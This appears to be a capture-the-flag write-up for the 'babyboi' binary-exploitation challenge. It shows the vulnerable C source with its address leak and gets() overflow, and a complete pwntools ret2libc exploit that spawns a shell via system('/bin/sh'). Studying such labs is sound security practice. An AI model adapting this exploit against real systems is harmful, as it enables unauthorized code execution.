# babyboi (pwn)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/5193c893-c44d-4eca-af75-3d2f0a0169bb)  
Now our binary is dynamically linked, which makes a couple of things different.  
Our binary is smaller, so we might not have that many ROP gadgets.  
Also we will now have most of `libc` available, since when Dynamically linking many unsused functions are linked.  
Also, most `libc` binaries have `/bin/sh` somewhere in them, so we might not have to write it to memory ourselves

Running this program prints an address and asks for input.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c347a3f8-bd2a-45a2-81f5-793d99a2ea0e)  

This time we are provided the source code and libc.  
Before even looking at the source code we can use `pwninit` to patch the binary. This way we can make sure that it is using the correct libc.  

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```
We can see that the address printed to console is the address of `printf()`, which will allow us to bypass aslr.  
Then we use `gets()`... >:(  

## Exploitation  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/84052646-d6fe-428e-b30d-d5b776f084e9)  
Notice that our small binary does not contain a syscall gadget.  
Therefore our previous approach of using ROP to call `execve` does not work.  
However, we can abuse the dynamically linked `libc` to call `system("/bin/sh")`.  

The plan is to use the leaked address to determine the position of system in `libc`, then use rop to load the address of `/bin/sh` to `rdi` and call `system()`.  

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby_boi_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(['./baby_boi_patched'] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./baby_boi_patched'] + argv, *a, **kw)

gdbscript = '''
tbreak main
'''.format(**locals())


def main():
    io = start()
    io.recvuntil(b"I am: ")

    printf_addr = int(io.recvline()[:-1],16)
    log.success("printf located @ "+hex(printf_addr))

    libc.address = printf_addr - libc.sym['printf'] #rebase our libc to bypass aslr

    binsh = next(libc.search(b"/bin/sh"))
    log.success("binsh string at "+hex(binsh)) # find the address of binsh in libc

    rop = ROP([exe,libc])
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] # this gadget will be used to load the address of binsh to memory
    log.success("pop rdi at "+hex(pop_rdi))

    ret = rop.find_gadget(['ret'])[0] # we need this to prevent stack alignment issues

    padding = b'A'*40 # pad until return address

    payload = padding + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
```
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/62af1d9f-2711-4d6c-b431-72504be0b0f2)


